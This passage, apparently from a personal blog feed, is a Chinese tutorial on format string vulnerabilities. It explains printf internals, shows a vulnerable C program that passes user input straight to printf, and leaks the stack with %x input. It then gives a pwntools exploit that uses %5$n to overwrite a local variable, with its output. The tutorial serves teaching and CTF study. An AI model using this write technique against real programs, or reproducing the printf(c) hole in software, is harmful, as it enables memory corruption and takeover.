of</code>的长度。<strong>具体原理：</strong>当<code>printf</code>在输出格式化字符串的时候，会维护一个内部指针，当<code>printf</code>逐步将格式化字符串的字符打印到屏幕，当遇到<code>%</code>的时候，<code>printf</code>会期望它后面跟着一个格式字符串，因此会递增内部字符串以抓取格式控制符的输入值。这就是问题所在，<code>printf</code>无法知道栈上是否放置了正确数量的变量供它操作，如果没有足够的变量可供操作，而指针按正常情况下递增，就会产生越界访问。甚至由于%n的问题，可导致任意地址读写。<sup>[5]</sup></p></blockquote><h4 id="Q5：常见的格式化字符串函数有哪些？-3"><a href="#Q5：常见的格式化字符串函数有哪些？-3" class="headerlink" title="Q5：常见的格式化字符串函数有哪些？ [3]"></a><font color="blue"><code>Q5：常见的格式化字符串函数有哪些？</code> </font><sup>[3]</sup></h4><div class="table-container"><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">基本介绍</th><th style="text-align:center">类别</th></tr></thead><tbody><tr><td style="text-align:center">scanf</td><td style="text-align:center">从stdin中向特定地址中读值</td><td style="text-align:center">输入</td></tr><tr><td style="text-align:center">printf</td><td style="text-align:center">输出到 stdout</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">fprintf</td><td style="text-align:center">输出到指定 FILE 流</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">vprintf</td><td style="text-align:center">根据参数列表格式化输出到 stdout</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">vfprintf</td><td style="text-align:center">根据参数列表格式化输出到指定 FILE 流</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">sprintf</td><td style="text-align:center">输出到字符串</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">snprintf</td><td style="text-align:center">输出指定字节数到字符串</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">vsprintf</td><td style="text-align:center">根据参数列表格式化输出到字符串</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">vsnprintf</td><td style="text-align:center">根据参数列表格式化输出指定字节到字符串</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">setproctitle</td><td style="text-align:center">设置 argv</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">syslog</td><td style="text-align:center">输出日志</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">err, verr, warn, vwarn 等</td><td style="text-align:center">……</td><td style="text-align:center">输出</td></tr></tbody></table></div><h3 id="0x02-格式化字符串漏洞原理"><a href="#0x02-格式化字符串漏洞原理" class="headerlink" title="0x02 格式化字符串漏洞原理"></a><font color="navy"><code>0x02 格式化字符串漏洞原理</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>Q1</code>中我们已经介绍了什么是格式化字符串，并且用例子也进一步说明，那么现在主要介绍一下格式化字符漏洞原理：格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>，所以当prinf函数没有格式化字符串时，我们可以通过输入控制字符来泄露内存信息，用下面的代码为例：</p><blockquote><p>正常应该这样写：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;        </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,c);</span><br><span class="line">    <span class="keyword">if</span>(a = <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fail"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>正常结果为</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">Fail</span><br></pre></td></tr></table></figure><p>&gt;</p><blockquote><p>由于开发者的粗心或者偷懒，将上述代码写成如下所示：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;        </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="built_in">printf</span>(c);</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fail"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>有一位大佬执行该程序后，输出的结果却是：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xd8\x16\xfa\xffaaaaSuccess</span><br></pre></td></tr></table></figure><blockquote><p>我们就以这个简单的例子入手，来梳理和讲解格式化字符串漏洞原理。</p></blockquote><h4 id="Q1：printf-quot-s-quot-c-和printf-c-有什么区别？"><a href="#Q1：printf-quot-s-quot-c-和printf-c-有什么区别？" class="headerlink" title="Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？"></a><font color="blue"><code>Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？</code></font></h4><p><img src="/images/119-2.jpg" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里主要看stack中的情况，其中左边的是<code>printf(&quot;%s&quot;,c);</code>语句，右边是<code>printf(c);</code>语句，从code中可以看出 printf 函数的<code>arg[0]</code>（格式化字符串）的地址并不一样，但是从 <code>stack</code> 中可以看到 esp 的地址，也就是两种情况格式化字符串在栈中的存储地址都是<code>0xffffd8a0</code>，由此可以看出</p><ul><li><code>printf(&quot;%s&quot;,c);</code>的格式化字符串为<code>%s</code></li><li><code>printf(c);</code>的格式化字符串为我们输入的<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>，在这里我们可以把<code>printf(c);</code>当作<code>printf(&quot;AAAA%x.%x.%x.%x.%x.%x.%x&quot;);</code>后续参数被省略掉，也就是说格式化字符串要打印的参数有<code>7</code>个，所以从格式化字符串的地址依次<code>+4</code>，则打印的参数地址为<code>esp+0x4</code>、<code>esp+0x8</code>、<code>esp+0xc</code>、<code>esp+0x10</code>、<code>esp+0x14</code>、<code>esp+0x18</code>、<code>esp+1c</code>，那么对于上图中的例子，输出的结果为：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：AAAA%x.%x.%x.%x.%x.%x.%x</span><br><span class="line">输出：AAAAffffd8b4.0.8049189.f7fb33fc.41414141.252e7825.78252e78</span><br><span class="line">Fail</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上述结果分别对应：</p><div class="table-container"><table><thead><tr><th style="text-align:center">栈顶偏移</th><th style="text-align:center">格式化字符串参数</th><th style="text-align:center">函数参数</th><th style="text-align:left">栈中地址</th><th style="text-align:center">输出结果</th></tr></thead><tbody><tr><td style="text-align:center">esp</td><td style="text-align:center">格式化字符串</td><td style="text-align:center">1</td><td style="text-align:left">0xffffd8a0 —&gt; 0xffffd8b4</td><td style="text-align:center">AAAA</td></tr><tr><td style="text-align:center">esp+0x4</td><td style="text-align:center">1</td><td style="text-align:center">2</td><td style="text-align:left">0xffffd8a4 —&gt; 0xffffd8b4</td><td style="text-align:center">ffffd8b</td></tr><tr><td style="text-align:center">esp+0x8</td><td style="text-align:center">2</td><td style="text-align:center">3</td><td style="text-align:left">0xffffd8a8 —&gt; 0x0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">esp+0xc</td><td style="text-align:center">3</td><td style="text-align:center">4</td><td style="text-align:left">0xffffd8ac —&gt; 0x8049189</td><td style="text-align:center">8049189</td></tr><tr><td style="text-align:center">esp+0x10</td><td style="text-align:center">4</td><td style="text-align:center">5</td><td style="text-align:left">0xffffd8b0 —&gt; 0xf7fb33fc</td><td style="text-align:center">f7fb33fc</td></tr><tr><td style="text-align:center">esp+0x14</td><td style="text-align:center">5</td><td style="text-align:center">6</td><td style="text-align:left">0xffffd8b4 (“AAAA”)</td><td style="text-align:center">41414141</td></tr><tr><td style="text-align:center">esp+0x18</td><td style="text-align:center">6</td><td style="text-align:center">7</td><td style="text-align:left">0xffffd8b8 (“%x.%”)</td><td style="text-align:center">252e7825</td></tr><tr><td style="text-align:center">esp+0x1c</td><td style="text-align:center">7</td><td style="text-align:center">8</td><td style="text-align:left">0xffffd8bc (“x.%x”)</td><td style="text-align:center">78252e78</td></tr></tbody></table></div><h4 id="Q2：为什么要输入AAAA-x-x-x-x-x-x-x"><a href="#Q2：为什么要输入AAAA-x-x-x-x-x-x-x" class="headerlink" title="Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x?"></a><font color="blue"><code>Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x?</code></font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在了解为什么要输入这个字符串之前，我们先来看看在运行程序时，局部变量存储的位置，这里就要清楚运行时栈的情况，如下图：</p><p><img src="/images/119-3.jpg" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上图可以看出，<strong>局部变量被存储在栈中</strong>（这里要说明的是全局变量被存储在.data段中），这里还是用<code>code2</code>的代码作为例子，看看<code>main</code>函数中变量 a、b 和 c 存放的位置，通过gdb进行调试，首先来确定变量 a 和 b 的位置，如下图：</p><p><img src="/images/119-4.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面我们再来寻找 c 的位置，如下图：</p><p><img src="/images/119-5.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上图中得信息可以得出局部变量 a、b 和 c 在栈中的情况，如下图：</p><p><img src="/images/119-6.png" alt></p><p><code>printf(&quot;%s&quot;,c); + 输入：AAAAAAAAAAAAAAAAAAAA</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面我们先来看看如果遇到正常的输出<code>printf(&quot;%s&quot;,c);</code>，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图：</p><p><img src="/images/119-7.png" alt></p><blockquote><p>输出结果为<code>AAAAAAAAAAAAAAAAAAAA</code>。从上图和结果可以看到esp处的是<code>格式化字符串</code>，里面只有一个控制字符<code>%s</code>，所以格式化字符串只有一参数，位于<code>esp+0x4</code> 处，那么输出的结果就是<code>esp+4</code>指向地址所对应的值<code>AAAAAAAAAAAAAAAAAAAA</code>。</p><p>注：这里有一点需要注意，任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串。<sup>[4]</sup></p></blockquote><p><code>printf(c); + 输入：AAAAAAAAAAAAAAAAAAAA</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面我们先来看看如果遇到<code>printf(c);</code>，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图：</p><p><img src="/images/119-8.png" alt></p><blockquote><p>输出结果为<code>AAAAAAAAAAAAAAAAAAAA</code>，虽然这里也是输出20个重复的A，但是和上面的情况完全不一样，这里是因为格式化字符串中没有控制符，所以只将格式化字符串输出，这里一定要分清。</p><p>那再想一想，因为格式化字符串是我们的输入，如果我们在输入中假如控制符，比如%x、%p、%n等，那么我们是不是就可以泄露栈上的信息呢？不懂的话下面来一个例子，也就回到了我们这个小问题上<code>为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x</code>？首先来简单的分析一下：</p><ul><li>因为我们输入的是 c 的值，c 是局部变量，所以输入的内容被分配在栈上</li><li>因为<code>printf(c);</code>函数中没有格式化字符串，只有一个参数 s，所以printf把<code>s</code>地址中的内容当作第一个参数，也就是printf函数的格式化字符串</li><li>因为我们的输入含有<code>7</code>个控制符<code>%x</code>，所以相当于printf函数的有<code>7</code>个<strong>格式化字符串参数</strong>（注意是格式化字符串参数，不是函数参数），所以我们可以将后面7个连续地址都打印出来</li><li>因为我们能控制的只有 c 的输入，所以我们可以通过<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>来查找 c 的起始地址（也可以说成参数偏移），从而可以进一步利用我们的输入来改相应的值</li></ul></blockquote><h4 id="Q3：利用格式化字符串漏洞能做社么-3"><a href="#Q3：利用格式化字符串漏洞能做社么-3" class="headerlink" title="Q3：利用格式化字符串漏洞能做社么?[3]"></a><font color="blue"><code>Q3：利用格式化字符串漏洞能做社么?</code></font><sup>[3]</sup></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过对格式化字符串漏洞的利用，可以实现如下功能：</p><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_2" target="_blank" rel="noopener">程序崩溃</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_3" target="_blank" rel="noopener">泄露内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_4" target="_blank" rel="noopener">泄露栈内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_5" target="_blank" rel="noopener">获取栈变量数值</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_6" target="_blank" rel="noopener">获取栈变量对应字符串</a></li></ul></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_7" target="_blank" rel="noopener">泄露任意地址内存</a></li></ul></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_8" target="_blank" rel="noopener">覆盖内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_12" target="_blank" rel="noopener">进行覆盖</a></li></ul></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_13" target="_blank" rel="noopener">覆盖任意地址内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_14" target="_blank" rel="noopener">覆盖小数字</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_15" target="_blank" rel="noopener">覆盖大数字</a></li></ul></li></ul></li></ul><h3 id="0x03-例题探析"><a href="#0x03-例题探析" class="headerlink" title="0x03 例题探析"></a><font color="navy"><code>0x03 例题探析</code></font></h3><blockquote><p>这里还是以code2中的代码为例：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;        </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="built_in">printf</span>(c);<span class="comment">// 存在格式化字符串漏洞</span></span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fail\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="①-编译"><a href="#①-编译" class="headerlink" title="① 编译"></a><code>① 编译</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了简单的进行格式化字符串漏洞，在编译时将保护关闭掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o format_string format_string.c</span><br></pre></td></tr></table></figure><h4 id="②-确定数组-c-在栈中相对于格式化字符参数序列"><a href="#②-确定数组-c-在栈中相对于格式化字符参数序列" class="headerlink" title="② 确定数组 c 在栈中相对于格式化字符参数序列"></a><code>② 确定数组 c 在栈中相对于格式化字符参数序列</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了确定数组 c 是格式化字符串的参数个数，这里需要通过我们的输入进行泄露，运行程序，并且输入：<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>，查看运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAff920694.0.8049189.f7f0c3fc.41414141.252e7825.78252e78Fail</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为“AAAA“的十六进制为”41414141“，所以我们可以判断数组 c 是格式化字符串的第 <code>5</code> 个参数，是printf函数的第 <code>6</code> 个参数，如图：</p><p><img src="/images/119-9.jpg" alt></p><blockquote><p>根据上图，我们简单的来画一下此时栈中的示意图：</p></blockquote><p><img src="/images/119-10.jpg" alt></p><h4 id="③-改变变量-a-的值"><a href="#③-改变变量-a-的值" class="headerlink" title="③ 改变变量 a 的值"></a><code>③ 改变变量 a 的值</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。<sup>[3]</sup>在这里我们想一想怎么才能改变 c 的值呢？让我们一步一步的深入研究：</p><blockquote><p>1)  我们已经知道了栈中的情况，以及变量 c 相对于格式化字符串的参数序列（第5个参数），而且我们能控制的输入只有 c，所以我们要想办法要通过对 c 的输入，向 a 地址写入我们想要输入的值</p><p><br>2)  如何实现这一目标呢？这里需要用到一个控制字符 <code>%n</code> 和 <code>%length$x</code></p><ul><li><code>%n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量；</li><li><code>%n$x</code>：<strong>可以直接获取栈中被视为printf函数第 n+1 个参数的值</strong></li></ul></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们已经确定了数组 c 的地址位置相当于格式化字符串的第 <code>5</code> 个参数，所以我们要在数组 c 的首地址写入 a 的地址，然后使用<code>%5$n</code> 向该地址写入 8，由于 a 的地址长度为 4，所以我们只需要在 <code>%5$n</code> 前面填充 <code>4</code> 个字符，这样输出的字符串长度为 <code>8</code>，那么 <code>%5$n</code> 就会将 <code>8</code> 赋值给格式化字符串的第 <code>5</code> 个参数所指向的地址，也可以将此构造（不唯一）格式进行统一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[address][padding][%len$n]</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述分析，我们可以构造如下payload：<code>a_addr + &quot;aaaa&quot; + &quot;%5$n&quot;</code>，则完整的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./printf_test2"</span>)</span><br><span class="line">a_addr = int(sh.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">payload = str(p32(a_addr),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"aaaa"</span> + <span class="string">"%5$n"</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print(<span class="string">"[+] result is:"</span>,sh.recvuntil(<span class="string">"\n"</span>))</span><br><span class="line">print(<span class="string">"[+] a_value is:"</span>,str(sh.recv(),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输出结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/Test# python3 printf_test2_exp.py </span><br><span class="line">[+] Starting local process &apos;./printf_test2&apos;: pid 2187</span><br><span class="line">[+] result is: b&apos;\xa8\xaa\x9f\xffaaaaSuccess\n&apos;</span><br><span class="line">[+] a_value is: 8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &apos;./printf_test2&apos; stopped with exit code 0 (pid 2187)</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><blockquote><p>从上述结果中的“success”，以及 a 的值中可以分析出，我们已经成功的将 a 的值改为了 <code>8</code>，这个时候栈中的情况如下示意图：</p></blockquote><p><img src="/images/119-11.png" alt></p><blockquote><p>这里要注意：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们不能直接在命令行输入 <code>\xa8\xaa\x9f\xffaaaa%5$n</code> 这是因为虽然前面的确实是 a 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 <code>\</code>、<code>x</code>、<code>a</code>、<code>8</code>，所以要用pwntool工具。</p></blockquote><h3 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04 References"></a><font color="navy"><code>0x04 References</code></font></h3><p>[1] <a href="https://zhuanlan.zhihu.com/p/94614529" target="_blank" rel="noopener">CWE和CVE及其关系</a></p><p>[2] <a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">格式化字符串</a></p><p>[3] <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/" target="_blank" rel="noopener">格式化字符串漏洞原理介绍</a></p><p>[4] <a href="https://blog.csdn.net/qq_43394612/article/details/84900668" target="_blank" rel="noopener">格式化字符串漏洞原理详解</a></p><p>[5] <a href="https://www.cnblogs.com/0xJDchen/p/5904816.html" target="_blank" rel="noopener">详谈Format String（格式化字符串）漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 前言&lt;/code&gt;&lt;/font&gt;&lt;/h3&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>学习计划表</title>
    <link href="https://muzibing.github.io/2020/05/25/2020.05.24%EF%BC%88118%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/25/2020.05.24（118）/</id>
    <published>2020-05-24T16:00:00.000Z</published>
    <updated>2020-06-03T12:58:06.471Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a7323a8a4eeaee41383701714f06c2863548ae8d270883536ed416d6fbba9b51">9b35bc5d657db7046bbe81d6b7730b9fdadb0066e66704b48261b29ef56eb7078a473e7e800bb8c995cc6339128c9020f1b17a4b6bbfcdd7560d4cf69b7650947ebb2ec01aa5bc9b69b27c9a122f4c1e95eaabc86baa6bc660982494c14004f31101a78b0c81eee7d788d52742178523784c993357b69f56027657988b1c50c2bb499db84363c2444f1491f89eccce600640f71cc887d5b0abfc3fb8ec230191bf1e7a5762412e9359d976e3e7b2b7e79b4aebaac8866a98ba2648ba510954c555822f4439d6f1c8f02844964ff517d43af647e351074e873a52013844ec275dab5dd233f940e5e4c7eb5198c4f0c0f7d6cd7c181b7b75fbdebf2a5ea7fa39374519f23e434081611dc79ce2498b46234709a8792d630c0045455cc26971ad262b5480280444e3a9683a240ec5b020283dc4344d47057fde202859b2b9dbafc07bf2d317fb50fac2a57b2ebde182b4d7ca8d3164cea4aa5fb23678696f3b9307bd64d35db1dc1291f3e0adfe0f65b235bdc2679ee7cc7958013a6948eddfb87d358067dc9c7f5806fd344479dc528db1f24d280dc4850f9d76a4e062278f6d5290b09f418fa9ef145da1ada4c8f9dd730db4325419418ca51b26cf0700bbb018a784a821eaa5f694b29a51ad1dfee7841c65c63ee98493254fd0060d0e5b5e9e8be4f79d172e9794a1afcb3601c48e2aaeabc99be61403b39e19358fbafbe301b742e1dd4ed172f8935fdf82ea2d7d778901c7303a0a7112d0c5618a31efcad61425b62e44b04cb7a399d7d6f4a1ad54f5a175f121ae9e1c622b12bc7ee59b87c03b9d5310d4ce3289fb2cd98f763b8ef18cd262531706a0a7c88a2f9908e967cbae0b1aeee1755fd5eb077a1c19a9b65d463a51e972b9d96e1974cfcde752a75de4b29a042a8ecbe86237704d8fb54074cff4c7b962a2cc428790a256a231ddab66b0d64b0342596269eb1b06df4cc60183f6e47dd3810be32ed142ecae91fcb095b3a3f9f2a6bae5856327427a68155396a0aaf0238c64f72b81f6317b4bb5826e8b6cfe237442e00a7ea42a3f8c3ef1d3a4a49f0264e099dfe8cff254a6e12115912c095ec7db32270c0d83a8dddc95019aa0026d68965f595e9cc30097a396099e0205be86d15a26380942d0c0e080ff86e35786d8b4fc404be4e7680e3e67122aec0c836b3495377f299b547b9fb781db07accddf2506db6989807e78431e1182a4cea8baf24fd7052a4925f02f8967da55f87710dae768e2a8dea3d606f67e9271304d2bf9b3dd289f0da2e1651824edcf7e29b7970690b3c39091940ce423973b4ea839b354203ce596dff90230fa2ea91323ef063eba3d417d2ee03e5b6a982e6cbc20bf885a0ff6db4b27f77de6428bfc31c46044afb1c58d61312d696744aa12144c50f11c3e29bd387576447039344f47b9f618bf7b55c6776a14af73d0ac9a88ad155c5a358d49e1039c564d7d61936d3